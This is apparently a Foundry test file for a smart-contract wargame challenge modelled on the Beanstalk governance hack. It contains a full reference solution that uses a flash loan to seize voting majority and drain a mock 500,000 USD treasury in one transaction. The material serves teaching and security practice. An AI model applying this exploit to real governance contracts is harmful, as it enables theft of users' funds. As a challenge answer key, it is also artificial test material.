// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// WARGAME CHALLENGE 4 — Flash-loan governance (maps to Beanstalk, Apr 2022, ~$182M)
//
// GovHeist counts the caller's CURRENT token balance as voting power, has no timelock, and lets a
// passing proposal make an arbitrary call. A flash lender holds 600,000 of the 1,000,000 GOV supply.
// Drain the 500,000 USD treasury and repay the loan, all in one transaction.
//
// To play: rewrite the GovAttacker contract below (the reference solution), then the marked lines.
// Win: you hold the 500,000 USD treasury and the loan is repaid.

import {Test} from "forge-std/Test.sol";
import {GovHeist, FlashLender, IFlashBorrower} from "../../src/ctf/VulnSystems.sol";
import {MockToken} from "../../src/common/ERC20.sol";

// ── reference solution: borrow a majority, pass+execute a treasury transfer, repay ──
contract GovAttacker is IFlashBorrower {
    FlashLender public lender;
    GovHeist public gov;
    MockToken public govToken;
    MockToken public usd;
    address public player;

    constructor(FlashLender _lender, GovHeist _gov, MockToken _govToken, MockToken _usd, address _player) {
        lender = _lender;
        gov = _gov;
        govToken = _govToken;
        usd = _usd;
        player = _player;
    }

    function pwn() external {
        lender.flashLoan(lender.maxLoan(), address(this), "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external {
        // this contract now holds a majority of GOV, so execute() accepts our proposal
        gov.execute(address(usd), abi.encodeWithSignature("transfer(address,uint256)", player, usd.balanceOf(address(gov))));
        govToken.transfer(address(lender), amount); // repay
    }
}

contract Challenge4_Governance is Test {
    MockToken gov;
    MockToken usd;
    FlashLender lender;
    GovHeist heist;
    address player = makeAddr("player");

    function setUp() public {
        gov = new MockToken("Governance", "GOV", 18);
        usd = new MockToken("USD", "USD", 18);
        lender = new FlashLender(gov);
        heist = new GovHeist(gov, usd);

        gov.mint(address(lender), 600_000e18); // a majority is borrowable
        gov.mint(makeAddr("dao"), 400_000e18); // honest holders
        usd.mint(address(heist), 500_000e18); // the treasury
    }

    function test_exploit() public {
        vm.startPrank(player);
        // ─────────────────────────────── SOLUTION ▼ (delete this and write your own) ───────────────────────────────
        GovAttacker atk = new GovAttacker(lender, heist, gov, usd, player);
        atk.pwn();
        // ─────────────────────────────── SOLUTION ▲ ───────────────────────────────
        vm.stopPrank();

        assertEq(usd.balanceOf(player), 500_000e18, "you should hold the whole treasury");
        assertEq(usd.balanceOf(address(heist)), 0, "the treasury is drained");
        assertEq(gov.balanceOf(address(lender)), 600_000e18, "the flash loan is repaid");
    }
}
